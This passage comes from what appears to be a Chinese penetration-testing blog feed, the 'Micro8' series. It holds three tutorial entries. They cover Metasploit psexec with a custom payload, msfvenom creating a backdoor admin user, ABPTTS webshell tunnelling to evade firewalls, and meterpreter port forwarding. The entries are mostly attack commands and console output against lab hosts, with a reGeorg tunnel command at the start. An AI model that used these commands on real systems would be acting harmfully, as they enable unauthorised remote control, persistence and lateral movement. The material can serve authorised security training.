reGeorgSocksProxy.py ‐p <span class="number">8080</span> ‐l <span class="number">192.168</span><span class="number">.1</span><span class="number">.5</span> ‐u http://<span class="number">192.168</span><span class="number">.1</span><span class="number">.119</span>/tunnel.aspx</span><br></pre></td></tr></table></figure><p><img src="../do/media/ecf64d63d586febad9c38bfa700ecd46.jpg" alt></p><p>Windows下配合Proxifier：  </p><p><img src="../do/media/e0ed655e244f7a76f703bfa13ec6bb4d.jpg" alt></p><p><img src="../do/media/48feea22eae0e72d9585eef488eb07f8.jpg" alt></p><p>非常遗憾的是，目前大部分waf都会针对默认原装版本的reGeorg。</p><blockquote><p>  Micropoor</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>97、MSF配置自定义Payload控制目标主机权限</title>
      <link href="/article/97_MSF%E9%85%8D%E7%BD%AE%E8%87%AA%E5%AE%9A%E4%B9%89Payload%E6%8E%A7%E5%88%B6%E7%9B%AE%E6%A0%87%E4%B8%BB%E6%9C%BA%E6%9D%83%E9%99%90.html"/>
      <url>/article/97_MSF%E9%85%8D%E7%BD%AE%E8%87%AA%E5%AE%9A%E4%B9%89Payload%E6%8E%A7%E5%88%B6%E7%9B%AE%E6%A0%87%E4%B8%BB%E6%9C%BA%E6%9D%83%E9%99%90.html</url>
      
        <content type="html"><![CDATA[<p>MSF的exploit模块下是支持set payload的，同样在复杂的网络环境下，许多模块也同样支持自定义的payload。可以更好的配合第三方框架，如第十一课中提到的Veil-Evasion等。</p><p>以exploit/windows/smb/psexec为demo。</p><p>攻击机配置如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(windows/smb/psexec) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/smb/psexec): </span><br><span class="line"></span><br><span class="line">Name Current Setting Required Description</span><br><span class="line">‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐</span><br><span class="line">RHOST 192.168.1.119 yes The target address</span><br><span class="line">RPORT 445 yes The SMB service port (TCP)</span><br><span class="line">SERVICE_DESCRIPTION no Service description to to be used on target fo rpretty listing</span><br><span class="line">SERVICE_DISPLAY_NAME no The service display name</span><br><span class="line">SERVICE_NAME no The service name</span><br><span class="line">SHARE ADMIN\$ yes The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share</span><br><span class="line">SMBDomain . no The Windows domain to use for authentication</span><br><span class="line">SMBPass 123456 no The password for the specified username</span><br><span class="line">SMBUser administrator no The username to authenticate as Payload options (windows/meterpreter/reverse_tcp): </span><br><span class="line"></span><br><span class="line">Name Current Setting Required Description</span><br><span class="line">‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐</span><br><span class="line">EXITFUNC thread yes Exit technique (Accepted: &apos;&apos;, seh, thread, process, none)</span><br><span class="line">LHOST 192.168.1.5 yes The listen address (an interface may be specified)</span><br><span class="line">LPORT 53 yes The listen port </span><br><span class="line"></span><br><span class="line">Exploit target: </span><br><span class="line">Id Name</span><br><span class="line">‐‐ ‐‐‐‐</span><br><span class="line">0 Automatic</span><br></pre></td></tr></table></figure><p><img src="../do/media/a88d25b5d8817aab5ef240672283dc24.jpg" alt></p><p>需设置一非，常用选项：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(windows/smb/psexec) &gt; set EXE::CUSTOM /var/www/html/bin_tcp_x86_53.exe</span><br><span class="line">EXE::CUSTOM =&gt; /var/www/html/bin_tcp_x86_53.exe</span><br></pre></td></tr></table></figure><p><img src="../do/media/adf249249993b5500e984f8c8bc6eba2.jpg" alt></p><p>靶机当前端口如下：  </p><p><img src="../do/media/7e2ed442134c4d03288e48471a79360d.jpg" alt></p><p>攻击机执行：</p><p><img src="../do/media/0f2ab61af6eba4c35ce5f14a3eadee06.jpg" alt></p><p>靶机端口变化如下：</p><p>虽报错，但并不影响执行。  </p><p><img src="../do/media/f052e2fa45e58d72f484f56afb1772d9.jpg" alt></p><p><strong>注意：</strong></p><p>Psexec创建一个服务后，来运行可执行文件（如Micropoor.exe）。但是将可执行文件作为服务，payload必须接受来自控制管理器的命令，否则将会执行失败。而psexec创建服务后，将随之停止，该payload处于挂起模式。</p><p>参考该服务源码：  </p><p><a href="https://github.com/rapid7/metasploit-framework/blob/master/data/templates/src/pe/exe/service/service.c" target="_blank" rel="noopener">https://github.com/rapid7/metasploit-framework/blob/master/data/templates/src/pe/exe/service/service.c</a>  </p><p>payload启动后，将会在过一段时间内退出。并强制终止。</p><p>故该参数一般用于adduser。配合adduser_payload。或者配合一次性执行完毕非常连接的payload。如下载。抓明文密码等。不适合需长连接通信的payload。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@John:/tmp# msfvenom ‐p windows/adduser PASS=Micropoor$123 USER=Micropoor ‐f exe &gt;adduser.exe</span><br><span class="line">[‐] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[‐] No arch selected, selecting arch: x86 from the payload</span><br><span class="line">No encoder or badchars specified, outputting raw payload</span><br><span class="line">Payload size: 279 bytes</span><br><span class="line">Final size of exe file: 73802 bytes</span><br></pre></td></tr></table></figure><p><img src="../do/media/6c388c67acdf21788d40d364d510e93e.jpg" alt></p><p><strong>同样可以配合target的改变来解决控制管理器的强制命令接收。</strong></p><p><strong>攻击机设置：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(windows/smb/psexec) &gt; show targets </span><br><span class="line"></span><br><span class="line">Exploit targets: </span><br><span class="line"></span><br><span class="line">Id Name</span><br><span class="line">‐‐ ‐‐‐‐</span><br><span class="line">0 Automatic</span><br><span class="line">1 PowerShell</span><br><span class="line">2 Native upload</span><br><span class="line">3 MOF upload</span><br><span class="line">msf exploit(windows/smb/psexec) &gt; set target 2</span><br><span class="line">target =&gt; 2</span><br><span class="line">msf exploit(windows/smb/psexec) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.1.5:53</span><br><span class="line">[*] 192.168.1.119:445 ‐ Connecting to the server...</span><br><span class="line">[*] 192.168.1.119:445 ‐ Authenticating to 192.168.1.119:445 as user &apos;administrator&apos;...</span><br><span class="line">[*] 192.168.1.119:445 ‐ Uploading payload... kKwZpPRs.exe</span><br><span class="line">[*] 192.168.1.119:445 ‐ Using custom payload /var/www/html/bin_tcp_x86\_53.exe, RHOST and RPORT settings will be ignored!</span><br><span class="line">[*] 192.168.1.119:445 ‐ Created kKwZpPRs.exe...</span><br><span class="line">[‐] 192.168.1.119:445 ‐ Unable to remove the service, ERROR_CODE:</span><br><span class="line">[‐] 192.168.1.119:445 ‐ Exploit failed: RubySMB::Error::UnexpectedStatusCode STATUS_PIPE_EMPTY</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br></pre></td></tr></table></figure><p><img src="../do/media/f0440595204a8fb13d4f8dbcf22925ec.jpg" alt></p><p>目标机：  </p><p><img src="../do/media/e5b1a086c8f9b612acde771c1cb82884.jpg" alt></p><p>在执行payload即可。</p><blockquote><p>  Micropoor</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>96、HTTP隧道ABPTTS第一季</title>
      <link href="/article/96_HTTP%E9%9A%A7%E9%81%93ABPTTS%E7%AC%AC%E4%B8%80%E5%AD%A3.html"/>
      <url>/article/96_HTTP%E9%9A%A7%E9%81%93ABPTTS%E7%AC%AC%E4%B8%80%E5%AD%A3.html</url>
      
        <content type="html"><![CDATA[<h3 id="ABPTTS简介："><a href="#ABPTTS简介：" class="headerlink" title="ABPTTS简介："></a>ABPTTS简介：</h3><p>ABPTTS是NCC Group在2016年blackhat推出的一款将TCP流量通过HTTP/HTTPS进行流量转发，在目前云主机的大环境中，发挥了比较重要的作用，可以通过脚本进行RDP,SSH,Meterpreter的交互与连接。也意味着这样可以建立一个通过80端口得流量出站来逃避防火墙。与其它http隧道不同的是，abptts是全加密。</p><p>2016年blackhat介绍：<br><a href="https://www.blackhat.com/us-16/arsenal.html#a-black-path-toward-the-sun" target="_blank" rel="noopener">https://www.blackhat.com/us-16/arsenal.html#a-black-path-toward-the-sun</a></p><p>Github：<br><a href="https://github.com/nccgroup/ABPTTS" target="_blank" rel="noopener">https://github.com/nccgroup/ABPTTS</a></p><p>安装与生成payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">root@John:~# git clone https://github.com/nccgroup/ABPTTS.git</span><br><span class="line">Cloning into &apos;ABPTTS&apos;...</span><br><span class="line">remote: Enumerating objects: 50, done.</span><br><span class="line">remote: Total 50 (delta 0), reused 0 (delta 0), pack‐reused 50</span><br><span class="line">Unpacking objects: 100% (50/50), done.</span><br><span class="line">root@John:~# pip install pycrypto</span><br><span class="line">Requirement already satisfied: pycrypto in /usr/lib/python2.7/dist‐packages (2.6.1)</span><br><span class="line">root@John:~# cd ABPTTS/</span><br><span class="line">root@John:~/ABPTTS# ls</span><br><span class="line">abpttsclient.py abpttsfactory.py ABPTTS‐Manual.pdf data libabptts.py license.txt README.md settings_overlays template</span><br><span class="line">root@John:~/ABPTTS# python abpttsfactory.py ‐o webshell</span><br><span class="line">[2019‐01‐28 08:24:28.131919] ‐‐‐===[[[ A Black Path Toward The Sun ]]]===‐‐‐</span><br><span class="line">[2019‐01‐28 08:24:28.131954] ‐‐==[[ ‐ Factory ‐ ]]==‐‐</span><br><span class="line">[2019‐01‐28 08:24:28.131965] Ben Lincoln, NCC Group</span><br><span class="line">[2019‐01‐28 08:24:28.131979] Version 1.0 ‐ 2016‐07‐30</span><br><span class="line">[2019‐01‐28 08:24:28.132706] Output files will be created in &quot;/root/ABPTTS/webshell&quot;</span><br><span class="line">[2019‐01‐28 08:24:28.132722] Client‐side configuration file will be written as &quot;/root/ABPTTS/webshell/config.txt&quot;</span><br><span class="line">[2019‐01‐28 08:24:28.132739] Using &quot;/root/ABPTTS/data/american‐english ‐lowercase‐4‐64.txt&quot; as a wordlist file</span><br><span class="line">[2019‐01‐28 08:24:28.136713] Created client configuration file &quot;/root/ABPTTS/webshell/config.txt&quot;</span><br><span class="line">[2019‐01‐28 08:24:28.137760] Created server file &quot;/root/ABPTTS/webshell/abptts.jsp&quot;</span><br><span class="line">[2019‐01‐28 08:24:28.138342] Created server file &quot;/root/ABPTTS/webshell/abptts.aspx&quot;</span><br><span class="line">[2019‐01‐28 08:24:28.138492] Created server file &quot;/root/ABPTTS/webshell/war/WEB‐INF/web.xml&quot;</span><br><span class="line">[2019‐01‐28 08:24:28.138555] Created server file &quot;/root/ABPTTS/webshell/war/META‐INF/MANIFEST.MF&quot;</span><br><span class="line">[2019‐01‐28 08:24:28.139128] Prebuilt JSP WAR file: /root/ABPTTS/webshell/scabGroup.war</span><br><span class="line">[2019‐01‐28 08:24:28.139140] Unpacked WAR file contents:/root/ABPTTS/webshell/war</span><br></pre></td></tr></table></figure><p><img src="../do/media/2784a52d852031eff237e0a3302d062d.jpg" alt></p><h3 id="靶机执行："><a href="#靶机执行：" class="headerlink" title="靶机执行："></a>靶机执行：</h3><p>以aspx为demo。  </p><p><img src="../do/media/d962cbc9afc4b8e245f7cd576f871fcb.jpg" alt></p><h3 id="攻击机执行："><a href="#攻击机执行：" class="headerlink" title="攻击机执行："></a>攻击机执行：</h3><p><strong>注：如果攻击机为vps，则 -f 需要填写vps_ip:port/目标机:port</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python abpttsclient.py ‐c webshell/config.txt ‐u &quot;http://192.168.1.119/abptts.aspx&quot; ‐f 192.168.1.5:33389/192.168.1.119:3389</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">root@John:~/ABPTTS# python abpttsclient.py ‐c webshell/config.txt ‐u &quot;http://192.168.1.119/abptts.aspx&quot; ‐f 192.168.1.5:33389/192.168.1.119:3389</span><br><span class="line">[2019‐01‐28 08:33:25.749115] ‐‐‐===[[[ A Black Path Toward The Sun ]]]===‐‐‐</span><br><span class="line">[2019‐01‐28 08:33:25.749153] ‐‐==[[ ‐ Client ‐ ]]==‐‐</span><br><span class="line">[2019‐01‐28 08:33:25.749160] Ben Lincoln, NCC Group</span><br><span class="line">[2019‐01‐28 08:33:25.749169] Version 1.0 ‐ 2016‐07‐30</span><br><span class="line">[2019‐01‐28 08:33:25.750372] Listener ready to forward connections from 192.168.1.5:33389 to 192.168.1.119:3389 via http://192.168.1.119/abptts.aspx</span><br><span class="line">[2019‐01‐28 08:33:25.750392] Waiting for client connection to 192.168.1.5:33389</span><br><span class="line">[2019‐01‐28 08:33:28.560180] Client connected to 192.168.1.5:33389</span><br><span class="line">[2019‐01‐28 08:33:28.560365] Waiting for client connection to 192.168.1.5:33389</span><br><span class="line">[2019‐01‐28 08:33:28.560655] Connecting to 192.168.1.119:3389 via http://192.168.1.119/abptts.aspx</span><br><span class="line">[2019‐01‐28 08:33:28.868187] Server set cookie ASP.NET_SessionId=boyfcepcijf43s0dhaz5of05; path=/; HttpOnly</span><br><span class="line">[2019‐01‐28 08:33:28.868269] [(S2C) 192.168.1.119:3389 ‐&gt; 192.168.1.5:33389 ‐&gt; 192.168.1.3:8861 (Connection ID: CEA116F4AF1FAF8C)] Server created connection ID CEA116F4AF1FAF8C</span><br><span class="line">[2019‐01‐28 08:33:29.077903] Connection‐level exception: [Errno 104] Connection reset by peer in thread for tunnel (192.168.1.3:8861 ‐&gt; 192.168.1.5:33389 ‐&gt; 192.168.1.119:3389)</span><br><span class="line">[2019‐01‐28 08:33:29.077967] Disengaging tunnel (192.168.1.3:8861 ‐&gt; 192.168.1.5:33389 ‐&gt; 192.168.1.119:3389)</span><br><span class="line">[2019‐01‐28 08:33:29.077987] Closing client socket (192.168.1.3:8861 ‐ &gt; 192.168.1.5:33389)</span><br><span class="line">[2019‐01‐28 08:33:29.078049] Exception while closing client socket (192.168.1.3:8861 ‐&gt; 192.168.1.5:33389): [Errno 107] Transport endpoint is not connected</span><br><span class="line">[2019‐01‐28 08:33:29.085280] Server closed connection ID CEA116F4AF1FAF8C</span><br><span class="line">[2019‐01‐28 08:33:36.957446] Client connected to 192.168.1.5:33389</span><br><span class="line">[2019‐01‐28 08:33:36.957601] Waiting for client connection to 192.168.1.5:33389</span><br><span class="line">[2019‐01‐28 08:33:36.957797] Connecting to 192.168.1.119:3389 via http://192.168.1.119/abptts.aspx</span><br><span class="line">[2019‐01‐28 08:33:36.966507] Server set cookie ASP.NET_SessionId=bsynuc3l5ndo5h0n0bhtrv5p; path=/; HttpOnly</span><br><span class="line">[2019‐01‐28 08:33:36.966587] [(S2C) 192.168.1.119:3389 ‐&gt; 192.168.1.5:33389 ‐&gt; 192.168.1.3:8862 (Connection ID: AA0FE7F073A5EFFD)] Server created connection ID AA0FE7F073A5EFFD</span><br><span class="line">[2019‐01‐28 08:33:45.321612] [(C2S) 192.168.1.3:8862 ‐&gt; 192.168.1.5:33389 ‐&gt; 192.168.1.119:3389 (Connection ID: AA0FE7F073A5EFFD)]: 25805 bytes sent since last report</span><br><span class="line">[2019‐01‐28 08:33:45.321700] [(S2C) 192.168.1.119:3389 ‐&gt; 192.168.1.5:33389 ‐&gt; 192.168.1.3:8862 (Connection ID: AA0FE7F073A5EFFD)] 12344 bytes sent since last report</span><br><span class="line">[2019‐01‐28 08:33:48.482758] [(C2S) 192.168.1.3:8862 ‐&gt; 192.168.1.5:33389 ‐&gt; 192.168.1.119:3389 (Connection ID: AA0FE7F073A5EFFD)]: 715 bytes sent since last report</span><br><span class="line">[2019‐01‐28 08:33:48.482838] [(S2C) 192.168.1.119:3389 ‐&gt; 192.168.1.5:33389 ‐&gt; 192.168.1.3:8862 (Connection ID: AA0FE7F073A5EFFD)] 2524 bytes sent since last report</span><br><span class="line">[2019‐01‐28 08:33:54.169354] Connection‐level exception: [Errno 104] Connection reset by peer in thread for tunnel (192.168.1.3:8862 ‐&gt; 192.168.1.5:33389 ‐&gt; 192.168.1.119:3389)</span><br><span class="line">[2019‐01‐28 08:33:54.169432] Disengaging tunnel (192.168.1.3:8862 ‐&gt; 192.168.1.5:33389 ‐&gt; 192.168.1.119:3389)</span><br><span class="line">[2019‐01‐28 08:33:54.169455] Closing client socket (192.168.1.3:8862 ‐ &gt; 192.168.1.5:33389)</span><br><span class="line">[2019‐01‐28 08:33:54.169529] Exception while closing client socket (192.168.1.3:8862 ‐&gt; 192.168.1.5:33389): [Errno 107] Transport endpoint is not connected</span><br><span class="line">[2019‐01‐28 08:33:54.178078] Server closed connection ID AA0FE7F073A5EFFD</span><br></pre></td></tr></table></figure><p><img src="../do/media/c52ff577d2cd3ceb5deb2ff11945d072.jpg" alt></p><p><img src="../do/media/a042b2937c5a751d17bd302e86fd7a4f.jpg" alt></p><p>非常遗憾的是，目前不支持PHP。</p><blockquote><p>  Micropoor</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>95、基于Portfwd端口转发</title>
      <link href="/article/95_%E5%9F%BA%E4%BA%8EPortfwd%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91.html"/>
      <url>/article/95_%E5%9F%BA%E4%BA%8EPortfwd%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91.html</url>
      
        <content type="html"><![CDATA[<p><strong>注：</strong>请多喝点热水或者凉白开，可预防<strong>肾结石，通风</strong>等。<br>痛风可伴发肥胖症、高血压病、糖尿病、脂代谢紊乱等多种代谢性疾病。</p><p>portfwd是一款强大的端口转发工具，支持TCP，UDP，支持IPV4–IPV6的转换转发。并且内置于meterpreter。其中exe单版本源码如下：</p><p><a href="https://github.com/rssnsj/portfwd" target="_blank" rel="noopener">https://github.com/rssnsj/portfwd</a></p><p><strong>攻击机：</strong><br>192.168.1.5 Debian</p><p><strong>靶机：</strong><br>192.168.1.4 Windows 7<br>192.168.1.119 Windows 2003</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(multi/handler) \&gt; sessions ‐l </span><br><span class="line"></span><br><span class="line">Active sessions</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">Id Name Type Information Connection</span><br><span class="line">‐‐ ‐‐‐‐ ‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐</span><br><span class="line">1 meterpreter x86/windows WIN03X64\Administrator @ WIN03X64 192.168.1.5:45303 ‐&gt; 192.168.1.119:53 (192.168.1.119)</span><br><span class="line"></span><br><span class="line">msf exploit(multi/handler) &gt; sessions ‐i 1 ‐c &apos;ipconfig&apos;</span><br><span class="line">[*] Running &apos;ipconfig&apos; on meterpreter session 1 (192.168.1.119) </span><br><span class="line"></span><br><span class="line">Windows IP Configuration </span><br><span class="line"></span><br><span class="line">Ethernet adapter 本地连接:</span><br><span class="line"></span><br><span class="line">Connection‐specific DNS Suffix . :</span><br><span class="line"></span><br><span class="line">IP Address. . . . . . . . . . . . : 192.168.1.119</span><br><span class="line">Subnet Mask . . . . . . . . . . . : 255.255.255.0</span><br><span class="line">Default Gateway . . . . . . . . . : 192.168.1.1 22</span><br></pre></td></tr></table></figure><p><img src="../do/media/95a0281ab0b49f1d079443a830c7244b.jpg" alt></p><p>靶机IP为：<br>192.168.1.119—windows 2003—x64</p><p>需要转发端口为：80，3389</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(multi/handler) &gt; sessions ‐i 1</span><br><span class="line">[*] Starting interaction with 1... </span><br><span class="line"></span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 4012 created.</span><br><span class="line">Channel 56 created.</span><br><span class="line">Microsoft Windows [版本 5.2.3790]</span><br><span class="line">(C) 版权所有 1985‐2003 Microsoft Corp.</span><br><span class="line"></span><br><span class="line">C:\Documents and Settings\Administrator\桌面&gt;if defined PSModulePath (echo ok!) else (echo sorry!)</span><br><span class="line">if defined PSModulePath (echo ok!) else (echo sorry!)</span><br><span class="line">sorry! </span><br><span class="line"></span><br><span class="line">C:\Documents and Settings\Administrator\桌面&gt;net config Workstation</span><br><span class="line">net config Workstation</span><br><span class="line">计算机名 \\WIN03X64</span><br><span class="line">计算机全名 win03x64</span><br><span class="line">用户名 Administrator</span><br><span class="line"></span><br><span class="line">工作站正运行于</span><br><span class="line">NetbiosSmb (000000000000)</span><br><span class="line">NetBT_Tcpip_&#123;37C12280‐A19D‐4D1A‐9365‐6CBF2CAE5B07&#125; (000C2985D67D) </span><br><span class="line"></span><br><span class="line">软件版本 Microsoft Windows Server 2003</span><br><span class="line"></span><br><span class="line">工作站域 WORKGROUP</span><br><span class="line">登录域 WIN03X64</span><br><span class="line"></span><br><span class="line">COM 打开超时 (秒) 0</span><br><span class="line">COM 发送计数 (字节) 16</span><br><span class="line">COM 发送超时 (毫秒) 250</span><br><span class="line">命令成功完成。</span><br><span class="line"></span><br><span class="line">C:\Documents and Settings\Administrator\桌面&gt;netstat ‐an|findstr &quot;LIST ENING&quot;</span><br><span class="line">netstat ‐an|findstr &quot;LISTENING&quot;</span><br><span class="line">TCP 0.0.0.0:80 0.0.0.0:0 LISTENING</span><br><span class="line">TCP 0.0.0.0:135 0.0.0.0:0 LISTENING</span><br><span class="line">TCP 0.0.0.0:445 0.0.0.0:0 LISTENING</span><br><span class="line">TCP 0.0.0.0:1025 0.0.0.0:0 LISTENING</span><br><span class="line">TCP 0.0.0.0:1026 0.0.0.0:0 LISTENING</span><br><span class="line">TCP 0.0.0.0:3078 0.0.0.0:0 LISTENING</span><br><span class="line">TCP 0.0.0.0:3389 0.0.0.0:0 LISTENING</span><br><span class="line">TCP 0.0.0.0:9001 0.0.0.0:0 LISTENING</span><br><span class="line">TCP 127.0.0.1:2995 0.0.0.0:0 LISTENING</span><br><span class="line">TCP 127.0.0.1:9000 0.0.0.0:0 LISTENING</span><br><span class="line">TCP 127.0.0.1:9999 0.0.0.0:0 LISTENING</span><br><span class="line">TCP 192.168.1.119:139 0.0.0.0:0 LISTENING</span><br></pre></td></tr></table></figure><p><img src="../do/media/f02edb927e950780d1f3db9a63051704.jpg" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; portfwd ‐h</span><br><span class="line">Usage: portfwd [‐h] [add | delete | list | flush] [args] </span><br><span class="line"></span><br><span class="line">OPTIONS:</span><br><span class="line">‐L &lt;opt&gt; Forward: local host to listen on (optional). Reverse: local host to connect to.</span><br><span class="line">‐R Indicates a reverse port forward.</span><br><span class="line">‐h Help banner.</span><br><span class="line">‐i &lt;opt&gt; Index of the port forward entry to interact with (see the &quot;list&quot; command).</span><br><span class="line">‐l &lt;opt&gt; Forward: local port to listen on. Reverse: local port to connect to.</span><br><span class="line">‐p &lt;opt&gt; Forward: remote port to connect to. Reverse: remote port to listen on.</span><br><span class="line">‐r &lt;opt&gt; Forward: remote host to connect to.</span><br></pre></td></tr></table></figure><p><img src="../do/media/97a637b2eabb1ba9e3461876e52d52bd.jpg" alt></p><p><strong>攻击机执行：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; portfwd add ‐l 33389 ‐r 192.168.1.119 ‐p 3389</span><br><span class="line">[*] Local TCP relay created: :33389 &lt;‐&gt; 192.168.1.119:3389</span><br><span class="line">meterpreter &gt; portfwd add ‐l 30080 ‐r 192.168.1.119 ‐p 80</span><br><span class="line">[*] Local TCP relay created: :30080 &lt;‐&gt; 192.168.1.119:80</span><br><span class="line">meterpreter &gt; portfwd </span><br><span class="line"></span><br><span class="line">Active Port Forwards</span><br><span class="line">==================== </span><br><span class="line">Index Local Remote Direction</span><br><span class="line">‐‐‐‐‐ ‐‐‐‐‐ ‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐</span><br><span class="line">1 0.0.0.0:33389 192.168.1.119:3389 Forward</span><br><span class="line">2 0.0.0.0:30080 192.168.1.119:80 Forward </span><br><span class="line"></span><br><span class="line">2 total active port forwards.</span><br></pre></td></tr></table></figure><p><img src="../do/media/c401d37dd5c3a91f5849712ac32fec62.jpg" alt></p><p><img src="../do/media/efa3f888364f0a9c68d08681ff071d1a.jpg" alt></p><p>查看攻击机LISTEN端口：转发已成功</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@John:~# netstat ‐ntlp |grep :3</span><br><span class="line">tcp 0 0 0.0.0.0:33389 0.0.0.0:* LISTEN 2319/ruby</span><br><span class="line">tcp 0 0 0.0.0.0:30080 0.0.0.0:* LISTEN 2319/ruby 